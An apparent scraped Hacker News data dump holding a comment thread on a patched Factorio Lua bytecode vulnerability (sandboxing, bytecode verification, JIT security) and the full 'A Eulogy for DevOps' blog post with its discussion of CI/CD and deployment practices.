sure the status of it now. Just shows how complex games / game engines are getting where you have an embedded web browser for seemingly no good reason. reply fwsgonzo 58 minutes agoparentprevThe first thing to look for is if the solution states clearly that it is a speculation-safe sandbox. I do think that not many will do that, but there are some. And go from there. reply est31 3 hours agoprevIn general, verifying programs is extremely hard, not just because of rice's theorem but because it's so easy to miss a spot, especially for non-trivial bytecode languages like lua's. wasm has no concepts of for loops for example. It's strange that after upstream has given up on the problem as it was too hard, factorio devs have chosen to try to fix the verifier/write their own (not sure which of the two they did). Minetest's loadstring function forbids bytecode entirely: https://github.com/minetest/minetest/blob/9a1501ae89ffe79c38... I wonder why factorio mods need the ability to execute raw lua bytecode. If they don't have it, there would be no need for a verifier. It's quite dangerous in the first place to execute lua code downloaded over the network. JS execution environments have gone through decades of cycles of discoveries of exploits and fixes. Lua gets those as well but on a smaller scale, and with less staffing to improve security. The main protection is I guess that there is fewer people running malicious game servers. reply Therenas 2 hours agoparentFactorio disabled bytecode loading in response to this. Bytecode did allow for some cool stuff like writing mods in a preprocessor language that spits out Lua bytecode, but ultimately the security issues were more important to address. Almost all of the debug library was made unavailable to mods as well, for similar security reasons. reply wruza 37 minutes agorootparentLoading raw bytecode is known to be unsafe, and iirc that is mentioned in lua_load/luaL_load* documentation. A preprocessor could spit out Lua code with the same effect and less complexity. Really interesting why and how these decision were made. reply gjsman-1000 2 hours agorootparentprevCitation? Factorio 1.1.101 (which the blog post says included the fix) does not list any changes regarding the disabling of bytecode or restricting the debug library. This would have been notable news, even without admitting the security risk. Factorio 1.1.107 does mention disabling the debug library, but it doesn’t seem this article had anything to do with that. reply Therenas 2 hours agorootparentI work on the game. The debug library was disabled for other security holes that were brought to our attention, so it wouldn‘t be related to this, but I thought it was interesting to mention. I believe the change was not mentioned in the changelog as an attempt at 'security through obscurity', trying to avoid people getting any ideas before the update is wide-spread. Not sure that helps any, but still. reply deely3 1 hour agorootparentSorry, but thats just a perfect example why 'security through obscurity' is wrong. I have zero idea about security risks, but if fix does not mentioned anywhere, then for people that use previous version there no rush to upgrade. reply TillE 1 hour agorootparent> no rush to upgrade I suspect the overwhelming majority of Factorio players are using Steam, which auto updates. reply magicalhippo 6 minutes agorootparentFactorio is special though, because it actively uses the beta version functionality in Steam to not only provide betas but also older stable versions. This allows the devs to move fast and break things. I know I've held back my copy of Factorio due to some concern over changes in newer versions, preferring to letting the dust settle before upgrading to the latest stable version. Therenas 1 hour agorootparentprevI don‘t disagree. reply ethbr1 1 hour agorootparentArguments either way. Generic \"security vulnerabilities addressed\" in release notes is a nice balance. reply JustAPerson 2 hours agoparentprevEventually every game developer learns the hard way that they must remove the bytecode ability from lua's loadstring() function. E.g. here's a 12 year old blogpost on the topic from the ROBLOX developers: https://archive.is/oXPyM To be honest, it would probably be better off disabled by default. Its legitimate uses are pretty niche. reply wruza 34 minutes agorootparentYep, its place is in luaconf.h really. reply marcosdumay 3 hours agoparentprevFactorio has stuff like this: https://mods.factorio.com/mod/Moon_Logic Besides, it's quite limiting to create software that can't just execute in a Turing complete environment. Anyway, we really need interpreters that include a strong capability system. reply dividuum 3 hours agorootparentOP only refers to bytecode. There's nothing wrong with executing Lua when provided to the VM via source code. The only reason to allow the VM to load bytecode directly is 1) a very minor improvement in loading time, as the interpreter then doesn't have to parse Lua code into bytecode itself 2) allowing obfuscation of logic running within Factorio. Both seem rather irrelevant, so I'm not sure why they allow loading bytecode directly. reply gjsman-1000 3 hours agorootparentprev“If I ran the business” (TM), I would just put it in Factorio settings as a toggle switch called “Reduced Security Mode - Allow Lua Bytecode.” By default, it’s turned off. People who really want those mods can turn it on, as long as they are informed (UAC prompt style) that they better trust the mod authors. I’d also add an API for mod authors to detect if bytecode access is enabled; so they can make their mods compatible with either environment. Or maybe, down the road, Factorio could enable mods with greater privileges, as long as they are open source, and do an App Store-style review process with the community. Approved mods get not just bytecode, but perhaps even some of the typically forbidden modules like filesystem access. Unapproved mods using those enhanced privileges won’t run without a startup flag. reply hypeatei 2 hours agorootparent> By default, it’s turned off. People who really want those mods can turn it on This works until a popular mod requires it (for legit reasons) then enabling the option becomes the de-facto standard for people who install mods. reply grogenaut 1 hour agorootparentIt's possible to make it so you enable it on a per mod basis, like app permissions reply tialaramex 1 hour agoparentprev> not just because of rice's theorem I don't think Rice is relevant at all. I guess Rice is a useful first screen. Do you believe you can \"just\" Decide this correctly? If so, Henry Rice got his PhD half a century ago for proving you can't do that, stop. But assuming you've made your peace with accepting only a subset of the inputs that would actually meet your requirements, Rice is done. And you're right - now instead of an impossible task you've just got an extremely hard task. This means when you fail (which you will) at least nobody will tell you it was impossible, if that helps? Factorio should not have done this. reply hypeatei 2 hours agoprevFactorio has a really good dev team behind it so I trust that they're doing their best to fix these issues. Though, gamedev in general seems to be more of a creative endeavor which puts things like code practices and security on the back burner. I wonder how many zero day exploits are lurking in game clients / servers. reply cedws 1 hour agoparentYeah, best to keep a separate computer for gaming for this reason. Definitely don’t put important documents or work stuff on it. It would be ideal to isolate it in a VM, but setting up a gaming VM can be a massive pain in the ass and exclude you from some games that use anticheat. reply gjsman-1000 2 hours agoparentprevMost likely, it’s not very good. Why do you think every console manufacturer, from Xbox to Sony to Nintendo, does not allow connecting to arbitrary server IP addresses or modding support? It’s not merely a business decision (like some believe) to force people to use official Online services. Think about it: Restricting connecting to third-party server IPs means that any bugs in the network code, or in the rest of the game, even atrocious ones, will never be exploited. Restricting mods (even “safe” mods like Lua) further prevents exploits. This makes sense - buggy network code has tanked multiple consoles’s DRM historically. And not just exploits - these consoles pride themselves on doing their review process before the code becomes available (despite oversights). Allowing executing of Lua, from a remote system, basically means a game could be reconfigured remotely after approval potentially from the developer themselves - not something any console manufacturer wants to permit without very close inspection. reply cedws 1 hour agoprevWe are seriously lucky such capable people are on the good side. reply josephcsible 2 hours agoprevIMO, Lua bytecode should never be usable anywhere outside of embedded systems that don't have enough resources to run the Lua source code parser. Besides security vulnerabilities, the only other thing it seems to be useful for is closed-source programs. reply therobots927 47 minutes agoprevI literally just downloaded a factorial demo to my work laptop. Is this something I need to be concerned about if I don’t play online? reply IggleSniggle 36 minutes agoparentNo. reply therobots927 20 minutes agorootparentThanks reply ec109685 1 hour agoprevIs it impractical to employ firecracker vm like separation to isolate untrusted code, severely reducing the impact of any bugs? Browsers split their various components across multiple processes to provide isolation. VMs would provide even more isolation. reply fwsgonzo 1 hour agoparentThat's what they do. They add additional layers on top of the sandbox like jailing. You can jail your sandboxes, but it's not so easy to make that a multi-platform solution for gaming. I think for games I would just stick to a fast interpreter and apply some generally appropriate measures to discourage timing attacks. reply BeefySwain 2 hours agoprevUnless I missed it (I admit I skimmed towards the end) The author does not discuss at all the actual remediation that was taken. I would love to hear more about that. reply bbor 1 hour agoprevAs a non-security dev, I'll drop the obligatory \"wow this is incredibly impressive!\" I can't believe how clear and logically you'd have to think to track down these intricate failure cases. Definitely not my strong suit! I'm much more of an \"ideas guy\" ;) Content-wise: Wow... We are totally, completely, utterly screwed once people start putting together ensembles of AI SWEs equipped with 10,000 blog posts like this one on finding weird memory exploits. Ultimately I think we're gonna need a whole new paradigm for security, or at least some new element in the stack. It's my potentially naive opinion that all the modern talk about \"trusted\" clients and DB roles and all that is trying to patch holes in swiss cheese; hopefully, we can find a new stack of LLM-maintained swiss cheese to add on instead! reply gjsman-1000 3 hours agoprev [–] At this point, I have serious doubts whether bytecode and JIT systems, whether it be Lua in Factorio or JavaScript in Chrome, can ever be verifiably secure. I think we would all be better off if, like Apple’s Lockdown mode, we can disable anything JIT on a high stakes system. I don’t blame Factorio though - this (anonymous?) researcher is 100x developer material. reply stavros 3 hours agoparentHow is JIT relevant here? Unless I missed something, the attack uses straight-up malicious byte code, it doesn't exploit the JIT compiler. reply gjsman-1000 3 hours agorootparentJIT and Bytecode are two sides of the same coin, in my head. JIT also uses bytecode in some languages like Java. reply nanidin 2 hours agorootparentIn this case someone generated malicious bytecode that the JIT compiler would not generate. I would argue JIT is dangerous because it requires dynamic memory without the NX bit set, so if you manage to smash the stack (find an exploit) you can execute arbitrary code easily (leverage the exploit). That's a different dangerous than running malicious bytecode. reply colejohnson66 48 minutes agorootparentJITs can still function with an NX bit; You just have to halt execution to modify it. reply pjmlp 2 hours agorootparentprevAll modern compilers use bytecode, in one form or the other. reply fwsgonzo 2 hours agorootparentprevIt's much worse than that because of the complexity around JITs, behavior of hardware and speculative execution. Proper sandboxing is really hard, and I suspect that if people really want security they would disable JIT in general. Even simple ones like pcre2. Personally I have disabled Firefox's JIT (I believe it's called ion in the settings, but correct me if I misremember) for a few years now. I've never had any trouble with any websites so far. It's not instant loading, but it's close enough. ... but I don't know if I would lump bytecode with JIT. Bytecodes don't need or use RWX execute segments, for example. Lots of your favorite JITs do, for speed. reply cedws 1 hour agoparentprevJIT has not been secure since Spectre and Meltdown. reply olliej 2 hours agoparentprevThe issue here isn’t things being “verifiably secure”. languages like js and lua run in a sandboxes environment where the only functions and operations that are permitted are those explicitly added by the host environment. Those sources languages are easily validated as correct code. [edit: I realize I should clarify something “correct” and “verifiable” here do not mean “bug free”, it means ‘cannot interfere with or violate language or environment state, memory, or other invariants’] The issue here is that the hosting environment is allowing the user/attacker to provide the bytecode that is generated from the provably correct code. That byte code is not itself verifiable statically, and is not verified at runtime (and it might not even be possible to). This is not to say that bytecode is not verifiable - Java, .NET, or even WASM (which is intentionally very low level) are verifiable bytecode environments. The issue is that a byte code must be _designed_ to be verifiable (and early Java bytecode was not due to JSR or similar iirc). Lua’s bytecode is designed for execution, and so allowing arbitrary bytecode execution is not too dissimilar from a JS engine allowing a website to provide direct access to their bytecode interpreter which would be similarly catastrophic. reply binary132 3 hours agoparentprev [–] I would take a look at BPF. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A vulnerability in Factorio's Lua implementation allowed malicious servers to execute arbitrary code on clients, patched in versions below 1.1.101.",
      "Factorio's Lua, crucial for game logic and mods, is exposed to network risks due to its deterministic lockstep multiplayer mode.",
      "The exploit path involves hosting a server with malicious Lua code, leading to memory leaks and remote code execution through Lua bytecode manipulation."
    ],
    "commentSummary": [
      "The discussion centers on the security risks of executing Lua bytecode in the game Factorio, highlighting the need for better documentation and sandboxing.",
      "Factorio has disabled bytecode loading and restricted the debug library due to security concerns, with suggestions for a \"Reduced Security Mode\" toggle for advanced users.",
      "Participants recommend various security measures, such as using VM isolation, avoiding bytecode in non-embedded systems, and ensuring bytecode verification, similar to Java and .NET environments."
    ],
    "points": 226,
    "commentCount": 43,
    "retryCount": 0,
    "time": 1719664551
  },
  {
    "id": 40826236,
    "title": "A Eulogy for DevOps",
    "originLink": "https://matduggan.com/a-eulogy-for-devops/",
    "originBody": "We hardly knew ye. DevOps, like many trendy technology terms, has gone from the peak of optimism to the depths of exhaustion. While many of the fundamental ideas behind the concept have become second-nature for organizations, proving it did in fact have a measurable outcome, the difference between the initial intent and where we ended up is vast. For most organizations this didn't result in a wave of safer, easier to use software but instead encouraged new patterns of work that centralized risk and introduced delays and irritations that didn't exist before. We can move faster than before, but that didn't magically fix all our problems. The cause of its death was a critical misunderstanding over what was causing software to be hard to write. The belief was by removing barriers to deployment, more software would get deployed and things would be easier and better. Effectively that the issue was that developers and operations teams were being held back by ridiculous process and coordination. In reality these \"soft problems\" of communication and coordination are much more difficult to solve than the technical problems around pushing more code out into the world more often. What is DevOps? DevOps, when it was introduced around 2007, was a pretty radical concept of removing the divisions between people who ran the hardware and people who wrote the software. Organizations still had giant silos between teams, with myself experiencing a lot of that workflow. Since all computer nerds also love space, it was basically us cosplaying as NASA. Copying a lot of the procedures and ideas from NASA to try and increase the safety around pushing code out into the world. Different organizations would copy and paste different parts, but the basic premise was every release was as close to bug free as time allowed. You were typically shooting for zero exceptions. When I worked for a legacy company around that time, the flow for releasing software looked as follows. Development team would cut a release of the server software with a release number in conjunction with the frontend team typically packaged together as a full entity. They would test this locally on their machines, then it would go to dev for QA to test, then finally out to customers once the QA checks were cleared. Operations teams would receive a playbook of effectively what the software was changing and what to do if it broke. This would include how it was supposed to be installed, if it did anything to the database, it was a whole living document. The idea was the people managing the servers, networking equipment and SANs had no idea what the software did or how to fix it so they needed what were effectively step by step instructions. Sometimes you would even get this as a paper document. Since these happened often inside of your datacenter, you didn't have unlimited elasticity for growth. So, if possible, you would slowly roll out the update and stop to monitor at intervals. But you couldn't do what people see now as a blue/green deployment because rarely did you have enough excess server capacity to run two versions at the same time for all users. Some orgs did do different datacenters at different times and cut between them (which was considered to be sort of the highest tier of safety). You'd pick a deployment day, typically middle of the week around 10 AM local time and then would monitor whatever metrics you had to see if the release was successful or not. These were often pretty basic metrics of success, including some real eyebrow raising stuff like \"is support getting more tickets\" and \"are we getting more hits to our uptime website\". Effectively \"is the load balancer happy\" and \"are customers actively screaming at us\". You'd finish the deployment and then the on-call team would monitor the progress as you went. Why Didn't This Work Part of the issue was this design was very labor-intensive. You needed enough developers coordinating together to put together a release. Then you needed a staffed QA team to actually take that software and ensure, on top of automated testing which was jusssttttt starting to become a thing, that the software actually worked. Finally you needed a technical writer working with the development team to walk through what does a release playbook look like and then finally have the Operations team receive, review the book and then implement the plan. It was also slow. Features would often be pushed for months even when they were done just because a more important feature had to go out first. Or this update was making major changes to the database and we didn't want to bundle in six things with the one possibly catastrophic change. It's effectively the Agile vs Waterfall design broken out to practical steps. A lot of the lip service around this time that was given as to why organizations were changing was, frankly, bullshit. The real reason companies were so desperate to change was the following: Having lots of mandatory technical employees they couldn't easily replace was a bummer Recruitment was hard and expensive. Sales couldn't easily inject whatever last-minute deal requirement they had into the release cycle since that was often set it stone. It provided an amazing opportunity for SaaS vendors to inject themselves into the process by offloading complexity into their stack so they pushed it hard. The change also emphasized the strengths of cloud platforms at the time when they were starting to gobble market share. You didn't need lots of discipline, just allocate more servers. Money was (effectively) free so it was better to increase speed regardless of monthly bills. Developers were understandably frustrated that minor changes could take weeks to get out the door while they were being blamed for customer complaints. So executives went to a few conferences and someone asked them if they were \"doing DevOps\" and so we all changed our entire lives so they didn't feel like they weren't part of the cool club. What Was DevOps? Often this image is used to sum it up: In a nutshell, the basic premise was that development teams and operations teams were now one team. QA was fired and replaced with this idea that because you could very quickly deploy new releases and get feedback on those releases, you didn't need a lengthy internal test period where every piece of functionality was retested and determined to still be relevant. Often this is conflated with the concept of SRE from Google, which I will argue until I die is a giant mistake. SRE is in the same genre but a very different tune, with a much more disciplined and structured approach to this problem. DevOps instead is about the simplification of the stack such that any developer on your team can deploy to production as many times in a day as they wish with only the minimal amounts of control on that deployment to ensure it had a reasonably high chance of working. In reality DevOps as a practice looks much more like how Facebook operated, with employees committing to production on their first day and relying extensively on real-world signals to determine success or failure vs QA and tightly controlled releases. In practice it looks like this: Development makes a branch in git and adds a feature, fix, change, etc. They open up a PR and then someone else on that team looks at it, sees it passes their internal tests, approves it and then it gets merged into main. This is effectively the only safety step, relying on the reviewer to have perfect knowledge of all systems. This triggers a webhook to the CI/CD system which starts the build (often of an entire container with this code inside) and then once the container is built, it's pushed to a container registry. The CD system tells the servers that the new release exists, often through a Kubernetes deployment or pushing a new version of an internal package or using the internal CLI of the cloud providers specific \"run a container as a service\" platform. It then monitors and tells you about the success or failure of that deployment. Finally there are release-aware metrics which allow that same team, who is on-call for their application, to see if something has changed since they released it. Is latency up, error count up, etc. This is often just a line in a graph saying this was old and this is new. Depending on the system, this can either be something where every time the container is deployed it is on brand-new VMs or it is using some system like Kubernetes to deploy \"the right number\" of containers. The sales pitch was simple. Everyone can do everything so teams no longer need as many specialized people. Frameworks like Rails made database operations less dangerous, so we don't need a team of DBAs. Hell, use something like Mongo and you never need a DBA! DevOps combined with Agile ended up with a very different philosophy of programming which had the following conceits: The User is the Tester Every System Is Your Specialization Speed Of Shipping Above All Catch It In Metrics Uptime Is Free, SSO Costs Money (free features were premium, expensive availability wasn't charged for) Logs Are Business Intelligence What Didn't Work The first cracks in this model emerged pretty early on. Developers were testing on their local Mac and Windows machines and then deploying code to Linux servers configured from Ansible playbooks and left running for months, sometimes years. Inevitably small differences in the running fleet of production servers emerged, either from package upgrades for security reasons or just from random configuration events. This could be mitigated by frequently rotating the running servers by destroying and rebuilding them as fresh VMs, but in practice this wasn't done as often as it should have been. Soon you would see things like \"it's running fine on box 1,2, 4, 5, but 3 seems to be having problems\". It wasn't clear in the DevOps model who exactly was supposed to go figure out what was happening or how. In the previous design someone who worked with Linux for years and with these specific servers would be monitoring the release, but now those team members often wouldn't even know a deployment was happening. Telling someone who is amazing at writing great Javascript to go \"find the problem with a Linux box\" turned out to be easier said than done. Quickly feedback from developers started to pile up. They didn't want to have to spend all this time figuring out what Debian package they wanted for this or that dependency. It wasn't what they were interested in doing and also they weren't being rewarded for that work, since they were almost exclusively being measured for promotions by the software they shipped. This left the Operations folks in charge of \"smoothing out\" this process, which in practice often meant really wasteful practices. You'd see really strange workflows around this time of doubling the number of production servers you were paying for by the hour during a deployment and then slowly scaling them down, all relying on the same AMI (server image) to ensure some baseline level of consistency. However since any update to the AMI required a full dev-stage-prod check, things like security upgrades took a very long time. Soon you had just a pile of issues that became difficult to assign. Who \"owned\" platform errors that didn't result in problems for users? When a build worked locally but failed inside of Jenkins, what team needed to check that? The idea of we're all working on the same team broke down when it came to assigning ownership of annoying issues because someone had to own them or they'd just sit there forever untouched. Enter Containers DevOps got a real shot in the arm with the popularization of containers, which allowed the movement to progress past its awkward teenage years. Not only did this (mostly) solve the \"it worked on my machine\" thing but it also allowed for a massive simplification of the Linux server component part. Now servers were effectively dumb boxes running containers, either on their own with Docker compose or as part of a fleet with Kubernetes/ECS/App Engine/Nomad/whatever new thing that has been invented in the last two weeks. Combined with you could move almost everything that might previous be a networking team problem or a SAN problem to configuration inside of the cloud provider through tools like Terraform and you saw a real flattening of the skill curve. This greatly reduced the expertise required to operate these platforms and allowed for more automation. Soon you started to see what we now recognize as the current standard for development which is \"I push out a bajillion changes a day to production\". What Containers Didn't Fix So there's a lot of other shit in that DevOps model we haven't talked about. So far teams had improved the \"build, test and deploy\" parts. However operating the crap was still very hard. Observability was really really hard and expensive. Discoverability was actually harder than ever because stuff was constantly changing beneath your feet and finally the Planning part immediately collapsed into the ocean because now teams could do whatever they wanted all the time. Operate This meant someone going through and doing all the boring stuff. Upgrading Kubernetes, upgrading the host operating system, making firewall rules, setting up service meshes, enforcing network policies, running the bastion host, configuring the SSH keys, etc. What organizations quickly discovered was that this stuff was very time consuming to do and often required more specialization than the roles they had previously gotten rid of. Before you needed a DBA, a sysadmin, a network engineer and some general Operations folks. Now you needed someone who not only understood databases but understood your specific cloud providers version of that database. You still needed someone with the sysadmin skills, but in addition they needed to be experts in your cloud platform in order to ensure you weren't exposing your database to the internet. Networking was still critical but now it all existed at a level outside of your control, meaning weird issues would sometimes have to get explained as \"well that sometimes happens\". Often teams would delay maintenance tasks out of a fear of breaking something like k8s or their hosted database, but that resulted in delaying the pain and making their lives more difficult. This was the era where every startup I interviewed with basically just wanted someone to update all the stuff in their stack \"safely\". Every system was well past EOL and nobody knew how to Jenga it all together. Observe As applications shipped more often, knowing they worked became more important so you could roll back if it blew up in your face. However replacing simple uptime checks with detailed traces, metrics and logs was hard. These technologies are specialized and require detailed understanding of what they do and how they work. A syslog centralized box lasts to a point and then it doesn't. Prometheus scales to x amount of metrics and then no longer works on a single box. You needed someone who had a detailed understanding of how metrics, logs and traces worked and how to work with development teams in getting them sending the correct signal to the right places at the right amount of fidelity. Or you could pay a SaaS a shocking amount to do it for you. The rise of companies like Datadog and the eye-watering bills that followed was proof that they understood how important what they were providing was. You quickly saw Observability bills exceed CPU and networking costs for organizations as one team would misconfigure their application logs and suddenly you have blown through your monthly quota in a week. Developers were being expected to monitor with detailed precision what was happening with their applications without a full understanding of what they were seeing. How many metrics and logs were being dropped on the floor or sampled away, how did the platform work in displaying these logs to them, how do you write an query for terabytes of logs so that you can surface what you need quickly, all of this was being passed around in Confluence pages being written by desperate developers who were learning as they were getting paged at 2AM how all this shit works together. Continuous Feedback This to me is the same problem as Observe. It's about whether your deployment worked or not and whether you had signal from internal tests if it was likely to work. It's also about feedback from the team on what in this process worked and what didn't, but because nobody ever did anything with that internal feedback we can just throw that one directly in the trash. I guess in theory this would be retros where we all complain about the same six things every sprint and then continue with our lives. I'm not an Agile Karate Master so you'll need to talk to the experts. Discover A big pitch of combining these teams was the idea of more knowledge sharing. Development teams and Operation teams would be able to cross-share more about what things did and how they worked. Again it's an interesting idea and there was some improvement to discoverability, but in practice that isn't how the incentives were aligned. Developers weren't rewarded for discovering more about how the platform operated and Operations didn't have any incentive to sit down and figure out how the frontend was built. It's not a lack of intellectual curiosity by either party, just the finite amount of time we all have before we die and what we get rewarded for doing. Being surprised that this didn't work is like being surprised a mouse didn't go down the tunnel with no cheese just for the experience. In practice I \"discovered\" that if NPM was down nothing worked and the frontend team \"discovered\" that troubleshooting Kubernetes was a bit like Warhammer 40k Adeptus Mechanicus waving incense in front of machines they didn't understand in the hopes that it would make the problem go away. Try restarting the Holy Deployment Plan Maybe more than anything else, this lack of centralization impacted planning. Since teams weren't syncing on a regular basis anymore, things could continue in crazy directions unchecked. In theory PMs were syncing with each other to try and ensure there were railroad tracks in front of the train before it plowed into the ground at 100 MPH, but that was a lot to put on a small cadre of people. We see this especially in large orgs with microservices where it is easier to write a new microservice to do something rather than figure out which existing microservice does the thing you are trying to do. This model was sustainable when money was free and cloud budgets were unlimited, but once that gravy train crashed into the mountain of \"businesses need to be profitable and pay taxes\" that stopped making sense. The Part Where We All Gave Up A lot of orgs solved the problems above by simply throwing bodies into the mix. More developers meant it was possible for teams to have someone (anyone) learn more about the systems and how to fix them. Adding more levels of PMs and overall planning staff meant even with the frantic pace of change it was...more possible to keep an eye on what was happening. While cloud bills continued to go unbounded, for the most part these services worked and allowed people to do the things they wanted to do. Then layoffs started and budget cuts. Suddenly it wasn't acceptable to spend unlimited money with your logging platform and your cloud provider as well as having a full team. Almost instantly I saw the shift as organizations started talking about \"going back to basics\". Among this was a hard turn in the narrative around Kubernetes where it went from an amazing technology that lets you grow to Google-scale to a weight around an organizations neck nobody understood. Platform Engineering Since there are no new ideas, just new terms, a successor to the throne has emerged. No longer are development teams expected to understand and troubleshoot the platforms that run their software, instead the idea is that the entire process is completely abstracted away from them. They provide the container and that is the end of the relationship. From a certain perspective this makes more sense since it places the ownership for the operation of the platform with the people who should have owned it from the beginning. It also removes some of the ambiguity over what is whose problem. The development teams are still on-call for their specific application errors, but platform teams are allowed to enforce more global rules. Well at least in theory. In practice this is another expansion of roles. You went from needing to be a Linux sysadmin to being a cloud-certified Linux sysadmin to being a Kubernetes-certified multicloud Linux sysadmin to finally being an application developer who can create a useful webUI for deploying applications on top of a multicloud stack that runs on Kubernetes in multiple regions with perfect uptime and observability that doesn't blow the budget. I guess at some point between learning the difference between AWS and GCP we were all supposed to go out and learn how to make useful websites. This division of labor makes no sense but at least it's something I guess. Feels like somehow Developers got stuck with a lot more work and Operation teams now need to learn 600 technologies a week. Surprisingly tech executives didn't get any additional work with this system. I'm sure the next reorg they'll chip in more. Conclusion We are now seeing a massive contraction of the Infrastructure space. Teams are increasingly looking for simple, less platform specific tooling. In my own personal circles it feels like a real return to basics, as small and medium organizations abandon technology like Kubernetes and adopt much more simple and easy-to-troubleshoot workflows like \"a bash script that pulls a new container\". In some respects it's a positive change, as organizations stop pretending they needed a \"global scale\" and can focus on actually servicing the users and developers they have. In reality a lot of this technology was adopted by organizations who weren't ready for it and didn't have a great plan for how to use it. However Platform Engineering is not a magical solution to the problem. It is instead another fabrication of an industry desperate to show monthly growth in cloud providers who know teams lack the expertise to create the kinds of tooling described by such practices. In reality organizations need to be more brutally honest about what they actually need vs what bullshit they've been led to believe they need. My hope is that we keep the gains from the DevOps approach and focus on simplification and stability over rapid transformation in the Infrastructure space. I think we desperately need a return to basics ideology that encourages teams to stop designing with the expectation that endless growth is the only possible outcome of every product launch. Share Topic DevOps GitHub Copilot Workspace Review I review Github Copilot Workspaces and it doesn't go well.… 18 Jun 2024",
    "commentLink": "https://news.ycombinator.com/item?id=40826236",
    "commentBody": "A Eulogy for DevOps (matduggan.com)212 points by weaksauce 20 hours agohidepastfavorite152 comments wokwokwok 18 hours agoThere’s so much truth in this. It really cuts to the heart of it when you looking at the “devops cycle” diagram with “build, test, deploy” …and yeah, those other ones… I remember being in a meeting where our engineering lead was explaining our “devops transformation strategy”. From memory that diagram turned up in the slides with a circle on “deploy”; the operational goal was “deploy multiple times a day”. It was about speed at any cost, not about engineering excellence. Fired the ops team. Restructured QA. You build it you run it”. Every team has an on call roster now. Sec dev ml ops; you’re an expert at everything right? The funny thing is you can take a mostly working stable system and make fast thoughtless chaotic changes to it for short term gains; so it superficially looks like it’s effective for a while. …but, surrrrpriiiisssseeee a few months later and suddenly you can’t make any changes without breaking things, no one knows what’s going on. I’m left with such mixed feelings; at the end of the day the tooling we got out of devops was really valuable. …but it was certainly a frustrating and expensive way to get there. We have new developers now who don’t know what devops is, but they know what containers are and expect to be able to deploy to production any time. I guess that’s a good way for devops to quietly wind up and go away. reply Sn0wCoder 18 hours agoparentDevOps and releasing multiple times per day does not always mean to PROD and in most industries that is impossible. Continuous Integration and Continuous Deployment should and do mean to the development branch and container. Locally I can write code and skip all the tests, skip the linter, skip prettier, etc.…. When I do a commit prettier is run. When I PR into develop other dev’s review the code. When its approved and completed a build is run (including all tests and sent to Veracode and SonarQube for analysis). The build is deployed to the development container where the developers can smoke test and then when SQA is ready promote to Integration for real testing. Fail fast! If the tests fail, we can fix them. If code quality goes down, we can fail the gate === no deployment. Without DevOps and CI/CD these steps get skipped. Not sure where the idea that software is released to production multiple times per ever came from. Yes, the develop branch should in theory be ready to be promoted at any time but we know that is not reality. reply lolinder 17 hours agorootparentThe big advantage to deploying to prod constantly is trunk-based development. Any system where you maintain a separate development branch is one where you're invariably going to be asked to cherry pick feature B to production but not feature A. This is a problem because you tested everything on a version of the code where B follows A, but now B needs to stand on its own. Can it? Maybe. But you didn't test that. With trunk-based development you have one main branch that everything goes to all the time. If you need something to not go out to real users then you put it behind a feature flag. If something needs to go out to users today, then you merge a change on top of your main branch that unconditionally shows the feature to users. This way all code that ever makes it into production exists at a point along a single linear commit history, each merge commit of which was checked by CI and is the same history that devs developed against locally. In my experience eliminating cherry picking makes a huge difference in reliability, and the only way to do that reliably is to constantly deploy to prod. And yes, my current $day_job does this. reply Sn0wCoder 17 hours agorootparentCongratulations on moving fast! If possible ‘trunk’ is best. Long lived branches are a problem if you are doing hot fixes to prod. The goal is the process avoids hot fixes and critical bugs. Some industries would not allow software to be released more than every few months. SQA needs to sign off. Users need to UAT. 2-week notice, 15-minute notice to log off. Downtime needs to be communicated to multiple time zones. Software versions need to be auditable for regulatory. The only point I was trying to make is ‘publishing’ multiple times per day with a team of developers requires ‘devops’ and that release does not always mean to prod. The same setup for releasing to prod multiple times per day is the same as releasing to develop multiple times per day. Long live DevOps reply signal11 14 hours agorootparent> Some industries would not allow software to be released more than every few months. SQA needs to sign off. Users need to UAT. 2-week notice, 15-minute notice to log off. Downtime needs to be communicated to multiple time zones. Software versions need to be auditable for regulatory. As a person who works in a heavily regulated field ($$$), all the audit / traceability requirements apply. We still move fast (multiple releases a day) because we have demonstrated that it reduces risk and promotes stability — something regulators are very interested in. In concrete terms, faster release rates are correlated with lower sevs (or incidents). But the underlying cause is really that faster release rates cause teams to adopt more reliable delivery practices, such as automated testing, gradual deployments, and so on. reply com 11 hours agorootparentEight years ago this was a hard sell to some regulators, no more. You still need to walk them through the outcomes but even in black letter jurisdictions it’s being accepted. reply fragmede 17 hours agorootparentprevthat doesn't work at scale though. the difference between dev, staging, and prod when there's a handful of services is fine. when there's 300 of them, and 200 of them are broken in the dev environment at any given time, that means you can't actually use the dev environment to do development in because the 300 other teams are also trying to do development in that same environment so their stuff is just as broken as your stuff. so then you either have to accept that sometimes it's broken and just wait on it, or otherwise agree that staging should always have a working copy of Kafka, except that means the Kafka team can now no longer use staging to stage Kafka changes, so then they have to setup their own separate staging environment and then plumb sufficiently representative test data into that new staging, and then and then and then. reply signal11 14 hours agorootparentWe have environments with thousands of services and it scales fine. Why would dev (or your lowest integration environment) be broken most of the time? > except that means the Kafka team That (a Kafka team, or a DB2 team) is a bit of a red flag for me. Many (but not all) “tech” teams like that are part of the problem. Cross functional delivery teams work much better, because running tech X in isolation is often not valuable. The one exception to this is “x as a service” teams. Eg DBaaS teams, Or even a team that offers a pub/sub service. But in those cases such teams are literally measured by uptime SLOs, so if a pub/sub team can’t deliver uptime, they’d need to improve. reply fragmede 6 hours agorootparentWhere are you that has thousands or services and it scales fine? Twitter and Facebook famously both don't have a separate staging environment because they have thousands or services and it doesn't scale fine. They do canary releases and feature flags so as to do gradual deployment and testing in prod. If they can't solve the problem but you're somewhere that has, my next question is are you hiring? Dev is broken because devs are doing dev on it. I mean, it generally works, but it's the bleeding edge of development so there's no real guarantee that someone didn't push something that doesn't work in a way that the rest of the company is relying on. What is the DBaaS or pub/sub team's commitment to uptime in the staging environment? It's staging. if they have to commit to a reasonable uptime, they can't actually use it as staging for themselves. Saying they need to improve is trying to handwave out the fact that they need a staging environment where they get to run experimental DBaaS or pub/sub things. reply bradknowles 15 minutes agorootparentI worked at AWS. Each team/service had their own alpha/beta/delta/gamma development environments, as well as one-box and blue/green production deployment environments, and deployed to waves of regions from smaller groups at the start to bigger groups at the end. That all seemed to work reasonably well. reply Sn0wCoder 16 hours agorootparentprevDevelopment should never be broken, ever. Ready to ship and broken are two different things. By ready to ship it more like v2 has 8 total new endpoints and only 2 are ready, then 4, then 6, then 8. When the tests fail, or the code quality goes down, the deployment fails. I would rather have DEV broken than PROD. Not sure how going directly to PROD would make anything better in this scenario. That is what Integration is for 